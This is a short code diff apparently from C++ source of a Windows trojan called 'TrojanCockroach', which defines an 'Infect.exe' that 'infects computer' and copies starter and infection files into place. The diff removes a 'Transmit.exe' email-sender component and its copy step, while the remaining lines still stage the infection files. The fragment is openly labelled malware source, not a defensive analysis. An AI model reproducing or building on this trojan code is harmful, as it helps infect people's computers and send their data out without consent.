@@ -5,7 +5,6 @@
 #define RUN_LINK_NAME "TrojanCockroach.lnk"  //starter link
 #define INFECT_FILE_NAME "Infect.exe"  //infects computer
 #define INFECT_LINK_NAME "Infect.lnk"  //link file
-#define EMAIL_SENDER_FILE_NAME "Transmit.exe"  //email sender
 
 #include <windows.h>
 #include <string>
@@ -40,17 +39,6 @@ main(){
         CopyFile(run_from, run, 0);
 
         ///////////////////////////
-        char net[100]={""};
-        strcat(net, folderPath);
-        strcat(net, "\\");
-        strcat(net, EMAIL_SENDER_FILE_NAME);
-
-        char net_from[100]={""};
-        strcat(net_from, FOLDER_NAME);
-        strcat(net_from, "\\");
-        strcat(net_from, EMAIL_SENDER_FILE_NAME);
-
-        CopyFile(net_from, net, 0);
 
         //////////////////////////
         char infect[100]={""};
